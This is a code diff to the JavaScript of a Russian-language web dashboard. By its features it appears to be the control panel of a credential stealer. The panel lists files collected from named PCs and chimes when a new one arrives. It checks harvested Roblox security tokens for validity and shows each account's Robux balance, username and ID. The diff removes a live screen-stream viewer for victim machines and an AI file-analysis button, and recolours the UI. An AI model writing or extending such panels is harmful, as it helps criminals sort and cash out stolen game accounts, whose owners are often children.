@@ -22,7 +22,9 @@ async function getTextSnippet(path) {
 async function loadFiles() {
   try {
     const r = await apiFetch("/files");
-    allFiles = await r.json();
+    const data = await r.json();
+    // Фильтруем системные файлы
+    allFiles = data.filter(f => !isHiddenFile(f.originalName || f.name));
     updateStats();
     populatePCFilter();
     filterFiles();
@@ -87,7 +89,7 @@ function renderFiles(list) {
 
     let previewHTML = "";
     if (isImg(nm)) {
-      previewHTML = "<img class='live-preview' data-pc='" + encodeURIComponent(pcName) + "' data-url='" + dlUrl + "' src='" + dlUrl + "?t=" + ts + "' alt='' loading='lazy'>";
+      previewHTML = "<img class='live-preview' data-pc='" + escapeHtml(pcName) + "' data-url='" + dlUrl + "' src='" + dlUrl + "?t=" + ts + "' alt='' loading='lazy'>";
     } else if (isText(nm)) {
       previewHTML = "<div class='card-preview-text text-preview-placeholder' data-url='/uploads/" + encodeURIComponent(f.name) + "'>Загрузка превью...</div>";
     } else {
@@ -174,26 +176,26 @@ function openModalByIndex(idx) {
     robuxRow.style.display = "flex";
     if (robuxInfo.valid === false) {
       robuxEl.textContent = "❌";
-      robuxEl.style.color = "#ff1744";
+      robuxEl.style.color = "var(--danger)";
       statusRow.style.display = "flex";
       statusEl.textContent = "Токен недействителен";
-      statusEl.style.color = "#ff1744";
+      statusEl.style.color = "var(--danger)";
     } else {
       robuxEl.textContent = robuxInfo.robux.toLocaleString() + " R$";
-      robuxEl.style.color = "#2ed573";
+      robuxEl.style.color = "var(--success)";
       if (robuxInfo.checked) {
         statusRow.style.display = "flex";
         statusEl.textContent = "Проверен: " + new Date(robuxInfo.checked).toLocaleString("ru");
-        statusEl.style.color = "#57606F";
+        statusEl.style.color = "var(--text-secondary)";
       }
     }
   } else if (roblox.security) {
     robuxRow.style.display = "flex";
     robuxEl.textContent = "⏳ Не проверен";
-    robuxEl.style.color = "#ffa502";
+    robuxEl.style.color = "var(--warning)";
     statusRow.style.display = "flex";
     statusEl.textContent = "Нажми «Проверить Robux»";
-    statusEl.style.color = "#57606F";
+    statusEl.style.color = "var(--text-secondary)";
   } else {
     robuxRow.style.display = "none";
     statusRow.style.display = "none";
@@ -215,12 +217,10 @@ function openModalByIndex(idx) {
       pane.querySelector(".modal-preview-text").textContent = "Не удалось прочесть файл.";
     });
   } else {
-    pane.innerHTML = "<div class='card-preview-icon' style='font-size: 7rem;'>" + icon(nm) + "</div>";
+    pane.innerHTML = "<div class='card-preview-icon' style='font-size: 7rem; opacity: 0.5;'>" + icon(nm) + "</div>";
   }
 
-  document.getElementById("modalStreamBtn").onclick = function() { openStreamModal(pc.name || "Unknown"); };
   document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
-  document.getElementById("modalAiBtn").onclick = function() { analyzeFile(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
 
   document.getElementById("fileModal").style.display = "flex";
@@ -229,25 +229,6 @@ function openModalByIndex(idx) {
 function closeModal() {
   document.getElementById("fileModal").style.display = "none";
   document.getElementById("modalPreviewPane").innerHTML = "";
-}
-
-function openStreamModal(pcName) {
-  document.getElementById("streamPcName").textContent = pcName;
-  document.getElementById("streamStatus").textContent = "⏳ Подключение к стриму...";
-  const img = document.getElementById("streamImg");
-  img.src = API_BASE + "/stream/" + encodeURIComponent(pcName) + "?token=" + getToken() + "&t=" + Date.now();
-  img.onload = function() {
-    document.getElementById("streamStatus").textContent = "● LIVE — стрим в реальном времени";
-  };
-  img.onerror = function() {
-    document.getElementById("streamStatus").textContent = "❌ Стрим недоступен (приложение закрыто или не передаёт кадры)";
-  };
-  document.getElementById("streamModal").style.display = "flex";
-}
-
-function closeStreamModal() {
-  document.getElementById("streamModal").style.display = "none";
-  document.getElementById("streamImg").src = "";
 }
 
 function copyToken() {
@@ -282,26 +263,6 @@ async function deleteFile(name) {
   }
 }
 
-async function analyzeFile(name) {
-  const p = document.getElementById("aiPanel");
-  const b = document.getElementById("aiBody");
-  p.style.display = "block";
-  b.textContent = "⏳ Анализирую...";
-  try {
-    const r = await apiFetch("/analyze", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ filename: name })
-    });
-    const d = await r.json();
-    b.textContent = d.analysis;
-    toast("✅ Анализ завершён");
-    loadFiles();
-  } catch (e) {
-    if (e.message !== 'auth') b.textContent = "❌ Ошибка анализа AI";
-  }
-}
-
 async function checkRobux(name) {
   const robuxRow = document.getElementById("robloxSpecRobuxRow");
   const robuxEl = document.getElementById("robloxSpecRobux");
@@ -309,10 +270,10 @@ async function checkRobux(name) {
   const statusEl = document.getElementById("robloxSpecStatus");
   robuxRow.style.display = "flex";
   robuxEl.textContent = "⏳ Проверка...";
-  robuxEl.style.color = "#ffa502";
+  robuxEl.style.color = "var(--warning)";
   statusRow.style.display = "flex";
   statusEl.textContent = "Запрос к Roblox API...";
-  statusEl.style.color = "#ffa502";
+  statusEl.style.color = "var(--warning)";
   try {
     const r = await apiFetch("/robux-check-file", {
       method: "POST",
@@ -322,15 +283,15 @@ async function checkRobux(name) {
     const info = await r.json();
     if (info.valid) {
       robuxEl.textContent = info.robux.toLocaleString() + " R$";
-      robuxEl.style.color = "#2ed573";
+      robuxEl.style.color = "var(--success)";
       statusEl.textContent = "Аккаунт: " + info.username + " (ID: " + info.userId + ")";
-      statusEl.style.color = "#57606F";
+      statusEl.style.color = "var(--text-secondary)";
       toast("💰 Robux: " + info.robux.toLocaleString());
     } else {
       robuxEl.textContent = "❌";
-      robuxEl.style.color = "#ff1744";
+      robuxEl.style.color = "var(--danger)";
       statusEl.textContent = "Ошибка: " + (info.error || "неизвестно");
-      statusEl.style.color = "#ff1744";
+      statusEl.style.color = "var(--danger)";
       toast("❌ Токен недействителен", "err");
     }
     loadFiles();
@@ -338,7 +299,7 @@ async function checkRobux(name) {
     if (e.message === 'auth') return;
     robuxEl.textContent = "❌";
     statusEl.textContent = "Ошибка сети: " + e.message;
-    statusEl.style.color = "#ff1744";
+    statusEl.style.color = "var(--danger)";
   }
 }
 
@@ -348,7 +309,7 @@ function setupSSE() {
   sse.onmessage = function(e) {
     try {
       const data = JSON.parse(e.data);
-      if (data.event === "new_file") {
+      if (data.event === "new_file" && !isHiddenFile(data.file?.originalName || data.file?.name)) {
         toast("📥 Получен новый файл!");
         playChime();
         loadFiles();
